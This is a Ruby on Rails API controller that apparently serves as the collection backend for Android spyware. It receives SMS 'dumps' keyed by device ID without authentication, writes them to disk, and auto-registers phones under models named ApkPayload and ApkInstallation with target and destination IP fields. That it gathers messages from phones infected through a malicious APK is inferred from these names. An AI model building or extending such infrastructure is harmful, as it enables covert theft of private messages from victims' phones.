module Api
  class SmsMessagesController < Api::BaseController
    def upload_dump
      device_id = params[:device_id] || request.headers['X-Device-ID']
      return render json: { error: 'Missing device_id' }, status: :bad_request if device_id.blank?
      
      smartphone = find_or_create_smartphone(device_id)
      
      # Save file if present
      if params[:file].present?
        filename = "sms_#{sanitize_device_id(device_id)}_#{Time.now.to_i}.json"
        filepath = Rails.root.join('files', 'dumps', 'sms', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.open(filepath, 'wb') { |f| f.write(params[:file].read) }
        
        smartphone.sms_messages.create!(
          filename: filename,
          date: Date.today
        )
      elsif params[:data].present?
        filename = "sms_#{sanitize_device_id(device_id)}_#{Time.now.to_i}.json"
        filepath = Rails.root.join('files', 'dumps', 'sms', filename)
        FileUtils.mkdir_p(File.dirname(filepath))
        File.write(filepath, params[:data].to_json)
        
        smartphone.sms_messages.create!(
          filename: filename,
          date: Date.today
        )
      end
      
      render json: { status: 'success', message: 'SMS data saved' }, status: :ok
    rescue => e
      Rails.logger.error("SMS Upload Error: #{e.message}")
      render json: { error: e.message }, status: :unprocessable_entity
    end
    
    private
    
    def sanitize_device_id(device_id)
      device_id.to_s.gsub(/[^a-zA-Z0-9_\-]/, '')
    end
    
    def find_or_create_smartphone(device_id)
      smartphone = Smartphone.find_by(device_id: device_id)
      return smartphone if smartphone
      
      # Create a default installation and smartphone
      payload = ApkPayload.first_or_create!(name: 'default', destination_ip: '0.0.0.0', destination_port: '8080')
      installation = ApkInstallation.first_or_create!(apk_payload: payload, target_ip: device_id, status: 'active')
      Smartphone.create!(device_id: device_id, name: "Device #{device_id[0..7]}", apk_installation: installation)
    end
  end
end
